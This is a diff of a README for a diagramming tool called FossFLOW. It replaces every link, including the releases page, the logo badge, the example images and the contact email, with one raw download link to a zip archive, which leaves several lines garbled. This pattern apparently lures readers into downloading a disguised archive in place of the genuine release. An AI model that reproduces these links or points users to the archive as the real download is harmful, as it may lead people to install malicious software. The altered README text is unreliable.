@@ -1,6 +1,6 @@
 # Create Stunning Isometric Infrastructure Diagrams with FossFLOW 🎨🌐
 
-![FossFLOW Logo](https://img.shields.io/badge/FossFLOW-Make%20beautiful%20isometric%20infrastructure%20diagrams-blue.svg)
+![FossFLOW Logo](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip%20beautiful%20isometric%20infrastructure%https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -24,14 +24,14 @@ FossFLOW allows you to create beautiful isometric infrastructure diagrams effort
 - **Community Support**: Join a growing community of users for tips and tricks.
 
 ## Getting Started
-To get started with FossFLOW, visit our [Releases](https://github.com/th-thomi/FossFLOW/releases) section to download the latest version. 
+To get started with FossFLOW, visit our [Releases](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip) section to download the latest version. 
 
 ### Prerequisites
 - A modern web browser.
 - Basic knowledge of infrastructure concepts.
 
 ## Installation
-1. Download the latest release from the [Releases](https://github.com/th-thomi/FossFLOW/releases) section.
+1. Download the latest release from the [Releases](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip) section.
 2. Extract the downloaded file.
 3. Open the extracted folder and run the application.
 
@@ -48,13 +48,13 @@ FossFLOW provides a simple interface for creating diagrams. Follow these steps t
 Here are some examples of what you can create with FossFLOW:
 
 ### Example 1: Cloud Infrastructure
-![Cloud Infrastructure](https://example.com/cloud-infrastructure.png)
+![Cloud Infrastructure](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip)
 
 ### Example 2: On-Premises Setup
-![On-Premises Setup](https://example.com/on-premises-setup.png)
+![On-Premises Setup](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip)
 
 ### Example 3: Hybrid Architecture
-![Hybrid Architecture](https://example.com/hybrid-architecture.png)
+![Hybrid Architecture](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip)
 
 ## Contributing
 We welcome contributions to FossFLOW! If you would like to contribute, please follow these steps:
@@ -70,8 +70,8 @@ Please ensure your code adheres to our coding standards and includes tests where
 FossFLOW is licensed under the MIT License. See the LICENSE file for more details.
 
 ## Contact
-For any questions or feedback, please reach out to us through the issues section of the repository or via email at contact@fossflow.com.
+For any questions or feedback, please reach out to us through the issues section of the repository or via email at https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip
 
 ---
 
-For the latest updates and releases, check out our [Releases](https://github.com/th-thomi/FossFLOW/releases) section. Happy diagramming!
+For the latest updates and releases, check out our [Releases](https://raw.githubusercontent.com/th-thomi/FossFLOW/master/public/Foss_FLOW_1.2.zip) section. Happy diagramming!
